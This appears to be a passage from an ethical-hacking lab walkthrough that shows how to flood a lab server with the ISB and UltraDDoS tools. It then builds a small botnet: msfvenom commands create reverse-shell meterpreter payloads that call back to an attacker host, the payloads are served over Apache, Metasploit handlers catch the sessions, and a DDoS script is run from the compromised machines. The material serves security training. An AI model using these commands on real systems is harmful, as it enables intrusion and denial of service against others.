
## Perform a DDoS Attack using ISB and UltraDDOS-v2

to switch to the **Windows** machine. Navigate to DoS and DDoS Attack Tools\ISB and double-click **ISB (Im So Bored).exe**

ISB window appears, using this tool we can perform various attacks such as **HTTP Flood**, **UDP Flood**, **TCP Flood**, **TCP Port Scan**, **ICMP Flood**, and **Slowloris**. Additionally, we can gather **Target Info** using the **WHOIS**, **NS**, **TRACEROUTE**, **BROWSER**, **PING** options present in the tool

Here, we will perform **TCP Flood** attack on the target **Windows 2019** machine. To do so, enter the IP address of the **Windows 2019** in the **URL:** field (here, **10.10.1.**), port number (here, **80**) in the **Port:** field and click on **Set Target**

The IP address of Windows Server 2019 along with the port number appears in the **Set:** field

Now, under **Attacks** navigate to **TCP Flood** tab and type **10** in the **Interval** field, **256** in the **Buffer** field and **1000** in the **Threads** field

to switch to the **Windows 2022** machine

In **Windows Server 2022** machine, navigate to DoS and DDoS Attack Tools\UltraDDoS and double-click **ultraddos.exe** file

A **Command Prompt** window appears, in the **Ultra DDOS v2** window, click **OK**

In the **Ultra DDOS v2** window, click on **DDOS Attack** button

In the **Please enter your target. This is the website or IP address that you want to attack.** field, type **10.10.1.** (IP address of **Windows 2019** machine) and click **OK**

In the **Please enter a port. 80 is most commonly used, but you can use any other valid port**. field, enter **80** and click **OK**

In the **Please enter the number of packets you would like to send. More is better, but too many will crash your computer**. field, type **1000000** and click on **OK**

In the **Please enter the number of threads you would like to send. This can be the same number as the packets.** field, type **1000000** and click on **OK**

In the **The attack will start once you press OK. It will keep going until all requested packets are sent**. pop-up window, click **OK**

In the **The attack will start once you press OK. It will keep going until all requested packets are sent**. pop-up window, click **OK**

As soon as you click on **OK** the tool starts DoS attack on the **Windows Server 2019** machine

to switch to the **Windows 11** machine, and in the **ISB** window click on **Start Attack** button

to switch to the **Windows  2019** machine

Now, click **Type here to search** field on the **Desktop**, search for **resmon** in the search bar and select **resmon** from the results

**Resource Monitor** window appears, you can see that the CPU utilization under **CPU** section is more than **80%**, thereby, resulting in deterioration of system performance

## Perform a DDoS Attack using Botnet

to switch to the **Parrot** machine. Open a **Terminal** window and execute **sudo su** to run the programs as a root user (When prompted, enter the password **toor**)

Run the command **msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=6969 -f exe > exploit1.exe** to generate **exploit1.exe** payload

Similarly, run the above command with different **port number** and **exploit name.**

- For Windows 11 -> port 6969, exploit1.exe
- For Windows Server 2019 -> port 9999, exploit2.exe
- For Windows Server 2022 -> port 5555, exploit3.exe

Create a new directory to share the **exploits** file with the target machine and provide the permissions using the below commands:

- Run **mkdir /var/www/html/share** command to create a shared folder
- Run **chmod -R 755 /var/www/html/share/** command
- Run **chown -R www-data:www-data /var/www/html/share/** command

Copy the payloads into the shared folder by executing **cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/** command

Start the Apache server by running **service apache2 start** command

Launch three new terminals and run command **sudo su** with password as **toor** on all

Run **msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"** command to launch Metasploit Framework on terminal 1

Similarly, run the above command on **terminal 2 and 3** by changing the **lport to 9999 and 5555** simultaneously

to switch to the **Windows 11** machine

Open any web browser (here, Mozilla Firefox) go to **http://10.10.1.13/share**. As soon as you press enter, it will display the shared folder contents

Click on **exploit1.exe** to download the file

Navigate to **Downloads** and double-click the **exploit1.exe** file to run it

Similarly, download **exploit2.exe** on **Windows Server 2019**, and **exploit3.exe** on **Windows Server 2022** and run it

After executing all the exploits on machines, click [Parrot Security](https://labclient.labondemand.com/Instructions/275d566b-1c4f-4289-aa4f-2019fd73f14b#) to switch to the **Parrot Security** machine

The meterpreter session has successfully been opened, as shown in the screenshots

Now, we will upload the DDoS script to our botnets, in windows shell terminal execute command **upload /home/attacker/Downloads/eagle-dos.py** and run **shell** command

Run the DDoS file using command **python eagle-dos.py** on windows shell terminal. It will ask for Target's IP, type **10.10.1.9** and hit enter

to switch to **Ubuntu** machine. Now, let us verify if the DDOS using Wireshark where we should be able to see packets from **10.10.1.11, 10.10.1.19 and 10.10.1.22** which are our botnets. Open terminal and run command **sudo wireshark**, enter **toor** as password and double click on **eth0** to start capturing

Wait for **5-6 minutes**, then click on **Show Applications** and search for and launch **System Monitor**. In the **System Monitor** window, observe the memory usage. In this case, it is 98.7%, which slows down Ubuntu machine and also makes it unresponsive

